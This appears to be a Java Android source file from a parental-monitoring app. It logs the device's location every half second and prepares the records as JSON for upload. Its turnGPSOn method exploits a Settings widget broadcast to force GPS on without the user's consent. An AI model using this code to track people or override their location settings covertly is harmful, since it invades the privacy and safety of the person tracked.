package com.parent.management.monitor;

import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Settings;
import android.util.Log;

import com.parent.management.ManagementApplication;
import com.parent.management.db.ManagementProvider;

public class GpsMonitor extends Monitor {
    private static final String TAG = ManagementApplication.getApplicationTag() + "." +
            GpsMonitor.class.getSimpleName();
    LocationManager mLocationManager;
    String mProvider = null;
    Context mContext = null;
    
    public GpsMonitor(Context context) {
        super(context);
        this.contentUri = CallLog.Calls.CONTENT_URI;
        mContext = ManagementApplication.getContext();
    }
    
    @Override
    public void startMonitoring() {
        mLocationManager = (LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);
        if (!mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            turnGPSOn();
        }
        
        mProvider = getAvailableProviderByPriority();
        
        if (null != mProvider) {
            Location currentLocation = mLocationManager.getLastKnownLocation(mProvider);
            updateLocation(currentLocation);
            mLocationManager.requestLocationUpdates(mProvider, 500, 0, mLocationListener);
        }
        
        this.monitorStatus = true;
    }
    
    String getAvailableProviderByPriority() {
        List<String> mProviders = mLocationManager.getAllProviders();
        
        if (mProviders.isEmpty()) {
            Log.e(TAG, "No provider can be used!");
            return null;
        }
        if (mProviders.contains(LocationManager.NETWORK_PROVIDER) &&
                mLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            Log.d(TAG, "use network provider");
            return LocationManager.NETWORK_PROVIDER;
        } else if (mProviders.contains(LocationManager.GPS_PROVIDER) &&
                mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            Log.d(TAG, "use gps provider");
            return LocationManager.GPS_PROVIDER;
        } else if (mProviders.contains(LocationManager.PASSIVE_PROVIDER) &&
                mLocationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
            Log.d(TAG, "use passive provider");
            return LocationManager.PASSIVE_PROVIDER;
        } else {
            Log.e(TAG, "can't get here, no active provider");
            return null;
        }
    }

    @Override
    public void stopMonitoring() {
        mLocationManager.removeUpdates(mLocationListener);
        this.monitorStatus = false;
    }
    
    private final LocationListener mLocationListener = new LocationListener() {    

        public void onLocationChanged(Location location) {    
            updateLocation(location);    
        }

        public void onProviderDisabled(String provider){
            Log.i(TAG, "Provider " + provider + " now is disabled..."); 
            updateLocation(null);
            mProvider = getAvailableProviderByPriority();
            if (null != mProvider) {
                Log.i(TAG, "Provider " + mProvider + " is available, change to it."); 
                mLocationManager.removeUpdates(mLocationListener);

                Location currentLocation = mLocationManager.getLastKnownLocation(mProvider);
                updateLocation(currentLocation);
                mLocationManager.requestLocationUpdates(mProvider, 500, 0, mLocationListener);
            }
        }    

        public void onProviderEnabled(String provider){ 
            Log.i(TAG, "Provider " + provider + " now is enabled..."); 
            mProvider = getAvailableProviderByPriority();
            if (null != mProvider && provider != mProvider) {
                Log.i(TAG, "Provider " + mProvider + "is better, change to it."); 
                mLocationManager.removeUpdates(mLocationListener);

                Location currentLocation = mLocationManager.getLastKnownLocation(mProvider);
                updateLocation(currentLocation);
                mLocationManager.requestLocationUpdates(mProvider, 500, 0, mLocationListener);
            }
        }    

        public void onStatusChanged(String provider, int status, Bundle extras){
            Log.i(TAG, "Provider " + provider + " status is changed, status=" + status); 
        }
    }; 

    private void updateLocation(Location location) {
        if (location != null) {
            double altitude = location.getAltitude();
            double latidude = location.getLatitude();
            double lontitude = location.getLongitude();
            float speed = location.getSpeed();
            long time = location.getTime();

            final ContentValues values = new ContentValues();
            values.put(ManagementProvider.Gps.ALTITUDE, altitude);
            values.put(ManagementProvider.Gps.LATIDUDE, latidude);
            values.put(ManagementProvider.Gps.LONGITUDE, lontitude);
            values.put(ManagementProvider.Gps.SPEED, speed);
            values.put(ManagementProvider.Gps.TIME, time);
            
            mContext.getContentResolver().insert(
                    ManagementProvider.Gps.CONTENT_URI, values);
            Log.v(TAG, "insert gps: altitude=" + altitude + ";latidude=" + latidude + ";lontitude=" + lontitude
                    + ";speed=" + speed + ";time=" + time);
        } else {
            Log.w(TAG, "not get Location");
        }
    }

    @Override
    public JSONArray extractDataForSend() {
        try {
            JSONArray data = new JSONArray();

            String[] GpsProj = new String[] {
                    ManagementProvider.Gps.ALTITUDE,
                    ManagementProvider.Gps.LATIDUDE,
                    ManagementProvider.Gps.LONGITUDE,
                    ManagementProvider.Gps.SPEED,
                    ManagementProvider.Gps.TIME};
            String GpsSel = ManagementProvider.Gps.IS_SENT + " = \""
                    + ManagementProvider.IS_SENT_NO + "\"";
            Cursor gpsCur = mContext.getContentResolver().query(
                    ManagementProvider.Gps.CONTENT_URI,
                    GpsProj, GpsSel, null, null);

            if (gpsCur == null) {
                Log.v(TAG, "open browserHistory native failed");
                return null;
            }
            if (gpsCur.moveToFirst() && gpsCur.getCount() > 0) {
                while (gpsCur.isAfterLast() == false) {
                    double alt = gpsCur.getDouble(
                            gpsCur.getColumnIndex(ManagementProvider.Gps.ALTITUDE));
                    double lat = gpsCur.getDouble(
                            gpsCur.getColumnIndex(ManagementProvider.Gps.LATIDUDE));
                    double lon = gpsCur.getDouble(
                            gpsCur.getColumnIndex(ManagementProvider.Gps.LONGITUDE));
                    float spd = gpsCur.getFloat(
                            gpsCur.getColumnIndex(ManagementProvider.Gps.SPEED));
                    long date = gpsCur.getLong(
                            gpsCur.getColumnIndex(ManagementProvider.Gps.TIME));
                    JSONObject raw = new JSONObject();
                    raw.put(ManagementProvider.Gps.ALTITUDE, alt);
                    raw.put(ManagementProvider.Gps.LATIDUDE, lat);
                    raw.put(ManagementProvider.Gps.LONGITUDE, lon);
                    raw.put(ManagementProvider.Gps.SPEED, spd);
                    raw.put(ManagementProvider.Gps.TIME, date);

                    data.put(raw);
                    gpsCur.moveToNext();
                }
            }
            if (null != gpsCur) {
                gpsCur.close();
            }
            
            Log.v(TAG, "data === " + data.toString());
            
            final ContentValues values = new ContentValues();
            values.put(ManagementProvider.Gps.IS_SENT, ManagementProvider.IS_SENT_YES);
            mContext.getContentResolver().update(
                    ManagementProvider.Gps.CONTENT_URI,
                    values,
                    ManagementProvider.Gps.IS_SENT + "=\"" + ManagementProvider.IS_SENT_NO +"\"",
                    null);
            
            return data;
        } catch (JSONException e) {
            Log.v(TAG, "Json exception:" + e.getMessage());
            e.printStackTrace();
        }

        return null;
    }

    @Override
    public void updateStatusAfterSend(JSONArray failedList) {
    	if (null != failedList && failedList.length() != 0) {
    		for (int i = 0; i < failedList.length(); ++i) {
    			JSONObject obj = failedList.optJSONObject(i);
    			if (null != obj) {
    				long id = obj.optLong(ManagementProvider.Gps._ID);
    		        final ContentValues values = new ContentValues();
    		        values.put(ManagementProvider.Gps.IS_SENT, ManagementProvider.IS_SENT_NO);
    		        mContext.getContentResolver().update(
    		        		ManagementProvider.Gps.CONTENT_URI,
    		                values,
    		                ManagementProvider.Gps._ID + "=\"" + id +"\"",
    		                null);
    			}
    		}
    	}
        String gpsSel = ManagementProvider.Gps.IS_SENT
        		+ " = \"" + ManagementProvider.IS_SENT_YES + "\"";
    	ManagementApplication.getContext().getContentResolver().delete(
    			ManagementProvider.Gps.CONTENT_URI,
    			gpsSel, null);
    }
    public void turnGPSOff()
    {
        if (Settings.Secure.getString(mContext.getContentResolver(), "location_providers_allowed").contains("gps"))
        {
            Intent localIntent = new Intent();
            localIntent.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            localIntent.addCategory("android.intent.category.ALTERNATIVE");
            localIntent.setData(Uri.parse("3"));
            mContext.sendBroadcast(localIntent);
        }
    }

    public void turnGPSOn()
    {
        if (!Settings.Secure.getString(mContext.getContentResolver(), "location_providers_allowed").contains("gps"))
        {
            Intent localIntent = new Intent();
            localIntent.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            localIntent.addCategory("android.intent.category.ALTERNATIVE");
            localIntent.setData(Uri.parse("3"));
            mContext.sendBroadcast(localIntent);
        }
    }

    public void updateProvider(String provider) {
        mProvider = getAvailableProviderByPriority();
        if (null != mProvider && provider != mProvider) {
            Log.i(TAG, "Provider " + mProvider + " is first priority now, change to it."); 
            mLocationManager.removeUpdates(mLocationListener);

            Location currentLocation = mLocationManager.getLastKnownLocation(mProvider);
            updateLocation(currentLocation);
            mLocationManager.requestLocationUpdates(mProvider, 500, 0, mLocationListener);
        }
    }
}
